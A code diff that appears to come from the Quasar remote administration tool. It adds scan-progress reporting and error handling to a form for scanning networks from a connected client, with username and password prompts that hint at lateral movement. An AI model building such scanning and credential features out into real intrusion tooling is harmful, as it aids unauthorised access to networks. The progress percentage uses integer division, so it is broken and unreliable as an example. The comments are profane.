@@ -27,8 +27,8 @@ namespace Quasar.Server.Forms
 
         private readonly NetworkHandler _networkHandler;
 
-        private BindingList<InterfaceBoxItem> _interfaceItems;
-        private BindingList<EntityListItem> _networkEntities;
+        private BindingList<InterfaceBoxItem> _interfaceItems = new BindingList<InterfaceBoxItem>();
+        private BindingList<EntityListItem> _networkEntities = new BindingList<EntityListItem>();
 
         /// <summary>
         /// Holds the opened network movement form for each client.
@@ -44,21 +44,28 @@ namespace Quasar.Server.Forms
         /// </returns>
         public static FrmNetworkMovement CreateNewOrGetExisting(Client client)
         {
-            if (OpenedForms.ContainsKey(client))
+            try
             {
-                return OpenedForms[client];
+                if (OpenedForms.ContainsKey(client))
+                {
+                    return OpenedForms[client];
+                }
+                FrmNetworkMovement f = new FrmNetworkMovement(client);
+                f.Disposed += (sender, args) => OpenedForms.Remove(client);
+                OpenedForms.Add(client, f);
+                return f;
             }
-            FrmNetworkMovement f = new FrmNetworkMovement(client);
-            f.Disposed += (sender, args) => OpenedForms.Remove(client);
-            OpenedForms.Add(client, f);
-            return f;
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.ToString());
+                return null;
+            }
         }
 
         public FrmNetworkMovement(Client client)
         {
             _connectClient = client;
             _networkHandler = new NetworkHandler(client);
-            _interfaceItems = new BindingList<InterfaceBoxItem>();
 
             RegisterMessageHandler();
             InitializeComponent();
@@ -85,6 +92,7 @@ namespace Quasar.Server.Forms
         {
             _connectClient.ClientState += ClientDisconnected;
             _networkHandler.NetworkScanResponseEvent += NetworkEntitiesChanged;
+            _networkHandler.NetworkScanProgressEvent += ScanProgressChanged;
             _networkHandler.InterfaceScanResponseEvent += InterfaceEntitiesChanged;
             MessageHandler.Register(_networkHandler);
         }
@@ -93,13 +101,13 @@ namespace Quasar.Server.Forms
         {
             MessageHandler.Unregister(_networkHandler);
             _networkHandler.InterfaceScanResponseEvent -= InterfaceEntitiesChanged;
+            _networkHandler.NetworkScanProgressEvent -= ScanProgressChanged;
             _networkHandler.NetworkScanResponseEvent -= NetworkEntitiesChanged;
             _connectClient.ClientState -= ClientDisconnected;
         }
 
         private void NetworkEntitiesChanged(object sender, NetworkScanResponseEventArgs args)
         {
-            MessageBox.Show("Holy shit entity changes!");
             try
             {
                 _networkEntities.Remove(_networkEntities.Where(item => item.address.Address.ToString() == args.Packet.Address.ToString() && item.nic.Name == args.Packet.Interface.Name).FirstOrDefault());
@@ -129,6 +137,40 @@ namespace Quasar.Server.Forms
             }
         }
 
+        private void ScanProgressChanged(object sender, NetworkScanProgressEventArgs args)
+        {
+            //This technically has a bug where users can start 2 scans, which then fucks the progress view
+            //But you only have to fix that if we have some STUPID fucking users.
+            if (args.Packet.Addresses <= 0)
+            {
+                if (statusStrip.InvokeRequired)
+                {
+                    statusStrip.BeginInvoke((MethodInvoker)delegate
+                    {
+                        toolStripProgress.Text = "Status: Idle...";
+                    });
+                }
+                else
+                {
+                    toolStripProgress.Text = "Status: Idle...";
+                }
+            }
+            else
+            {
+                if (statusStrip.InvokeRequired)
+                {
+                    statusStrip.BeginInvoke((MethodInvoker)delegate
+                    {
+                        toolStripProgress.Text = $"Status: Scanning {args.Packet.Addresses} IPs... ({Math.Round((double)(args.Packet.CurrentAddress / args.Packet.Addresses), 4)}% Complete)";
+                    });
+                }
+                else
+                {
+                    toolStripProgress.Text = $"Status: Scanning {args.Packet.Addresses} IPs... ({Math.Round((double)(args.Packet.CurrentAddress / args.Packet.Addresses), 4)}% Complete)";
+                }
+            }
+        }
+
         private void ClientDisconnected(Client client, bool connected)
         {
             if (!connected)
@@ -149,7 +191,7 @@ namespace Quasar.Server.Forms
             string password = string.Empty;
             string command = string.Empty;
             if (InputBox.Show("Username", "Enter Username:", ref username) == DialogResult.OK &&
-                InputBox.Show("Password", "Enter Password:", ref password) == DialogResult.OK
+                InputBox.Show("Password", "Enter Password:", ref password) == DialogResult.OK)
             {
 
             }
